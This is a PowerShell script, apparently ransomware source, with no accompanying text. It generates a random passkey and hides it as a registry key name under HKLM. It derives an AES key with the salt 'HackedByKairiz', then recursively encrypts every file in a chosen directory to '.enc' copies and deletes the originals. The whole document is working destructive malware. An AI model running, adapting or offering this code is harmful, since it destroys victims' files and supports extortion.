function GeneratePasskey {
    $PassKey = -join((65..90) + (97..122) | Get-Random -Count 20 | %{[char]$_})
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($PassKey)
    $base64key = [Convert]::ToBase64String($Bytes)
    return $base64key
}

function EncryptFilesInDirectory {
    param (
        [string]$DirectoryPath
    )

    $base64key = GeneratePasskey
    Write-Host "Generated Base64 Key: $base64key"

    if (-not $base64key) {
        Write-Host "Error: base64key is not defined."
        return
    }

    Write-Host "Decoding base64 key..."
    $DecodeText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64key))

    Write-Host "Creating registry entry..."
    # Save Decoder key to registry
    New-Item -Path "Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Policies" -Name $DecodeText -ErrorAction SilentlyContinue

    Write-Host "Generating key and IV from password..."
    # Generate a key and IV from the password
    $keyBytes = New-Object byte[] 32
    $ivBytes = New-Object byte[] 16

    $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($DecodeText, [System.Text.Encoding]::UTF8.GetBytes("HackedByKairiz"), 1000)
    $keyBytes = $deriveBytes.GetBytes(32)
    $ivBytes = $deriveBytes.GetBytes(16)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $keyBytes
    $aes.IV = $ivBytes

    $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)

    Write-Host "Retrieving all files in the directory..."
    # Get all files in the directory and subdirectories
    $files = Get-ChildItem -Path $DirectoryPath -File -Recurse

    if ($files.Count -eq 0) {
        Write-Host "No files found in the directory."
        return
    }

    foreach ($file in $files) {
        $inputFilePath = $file.FullName
        $outputFilePath = $inputFilePath + ".enc"

        Write-Host "Encrypting file: $inputFilePath to $outputFilePath"

        $fsInput = [System.IO.File]::OpenRead($inputFilePath)
        $fsOutput = [System.IO.File]::OpenWrite($outputFilePath)

        $cs = New-Object System.Security.Cryptography.CryptoStream($fsOutput, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

        $buffer = New-Object byte[] 1024
        $readBytes = 0

        while (($readBytes = $fsInput.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $cs.Write($buffer, 0, $readBytes)
        }

        $cs.Close()
        $fsInput.Close()
        $fsOutput.Close()

        Write-Host "File encrypted successfully: $inputFilePath to $outputFilePath"
        Remove-Item $inputFilePath
    }
}
